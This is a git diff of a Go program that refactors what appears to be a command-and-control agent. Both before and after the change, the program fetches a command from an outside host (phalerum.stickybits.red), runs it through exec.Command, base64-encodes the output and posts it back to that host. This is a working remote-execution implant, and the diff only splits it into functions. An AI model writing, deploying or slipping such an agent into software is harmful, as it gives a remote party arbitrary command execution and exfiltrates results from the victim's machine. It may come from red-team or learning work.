@@ -16,8 +16,8 @@ type Post struct {
 	Message string `json:"message"`
 }
 
-func main() {
-	resp, err := http.Get("https://phalerum.stickybits.red/api/v1/agents/test")
+func getCmd(url string) []string {
+	resp, err := http.Get(url)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -27,21 +27,42 @@ func main() {
 		fmt.Printf("Error: %s", err)
 	}
 
-	split := strings.Split(string(resBody), " ")
+	args := strings.Split(string(resBody), " ")
 
-	cmd := exec.Command(split[0], split[1:]...)
+	return args
+}
+
+func execCmd(args []string) []byte {
+	cmd := exec.Command(args[0], args[1:]...)
 	out, err := cmd.Output()
 	if err != nil {
 		fmt.Println(cmd)
 		fmt.Println("Error running command: ", err)
 	}
 
-	// fmt.Println(out)
+	return out
+}
 
-	sEnc := base64.StdEncoding.EncodeToString([]byte(string(out)))
+func postOut(reader io.Reader) {
+	_, err := http.Post("https://phalerum.stickybits.red/api/v1/agents/test", "application/json", reader)
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+
+func encodeOutput(output []byte) string {
+	sEnc := base64.StdEncoding.EncodeToString([]byte(string(output)))
+
+	return sEnc
+}
+
+func main() {
+	url := "https://phalerum.stickybits.red/api/v1/agents/test"
+	args := getCmd(url)
+	out := execCmd(args)
 
 	jsonBody := Post{
-		Message: sEnc,
+		Message: encodeOutput(out),
 	}
 
 	bodyBytes, err := json.Marshal(&jsonBody)
@@ -51,10 +72,6 @@ func main() {
 
 	reader := bytes.NewReader(bodyBytes)
 
-	presp, err := http.Post("https://phalerum.stickybits.red/api/v1/agents/test", "application/json", reader)
-	if err != nil {
-		log.Fatal(err)
-	}
+	postOut(reader)
 
-	fmt.Printf(presp.Status)
 }
